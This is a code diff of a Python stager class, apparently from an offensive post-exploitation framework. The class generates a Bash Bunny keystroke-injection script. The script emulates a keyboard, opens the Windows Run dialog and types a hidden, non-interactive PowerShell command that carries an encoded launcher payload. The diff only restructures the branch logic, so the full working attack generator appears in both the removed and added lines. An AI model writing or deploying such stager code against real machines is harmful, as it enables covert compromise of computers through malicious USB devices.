@@ -157,20 +157,20 @@ class Stager:
         if launcher == "":
             print(helpers.color("[!] Error in launcher command generation."))
             return ""
-        else:
-            enc = launcher.split(" ")[-1]
-            bunny_code = "#!/bin/bash\n"
-            bunny_code += "LED R G\n"
-            bunny_code += "source bunny_helpers.sh\n"
-            bunny_code += "ATTACKMODE HID\n"
-            if keyboard != "":
-                bunny_code += "Q SET_LANGUAGE " + keyboard + "\n"
-            bunny_code += "Q DELAY 500\n"
-            bunny_code += "Q GUI r\n"
-            bunny_code += "Q STRING " + interpreter + "\n"
-            bunny_code += "Q ENTER\n"
-            bunny_code += "Q DELAY 500\n"
-            bunny_code += "Q STRING powershell -W Hidden -nop -noni -enc " + enc + "\n"
-            bunny_code += "Q ENTER\n"
-            bunny_code += "LED R G B 200\n"
-            return bunny_code
+
+        enc = launcher.split(" ")[-1]
+        bunny_code = "#!/bin/bash\n"
+        bunny_code += "LED R G\n"
+        bunny_code += "source bunny_helpers.sh\n"
+        bunny_code += "ATTACKMODE HID\n"
+        if keyboard != "":
+            bunny_code += "Q SET_LANGUAGE " + keyboard + "\n"
+        bunny_code += "Q DELAY 500\n"
+        bunny_code += "Q GUI r\n"
+        bunny_code += "Q STRING " + interpreter + "\n"
+        bunny_code += "Q ENTER\n"
+        bunny_code += "Q DELAY 500\n"
+        bunny_code += "Q STRING powershell -W Hidden -nop -noni -enc " + enc + "\n"
+        bunny_code += "Q ENTER\n"
+        bunny_code += "LED R G B 200\n"
+        return bunny_code
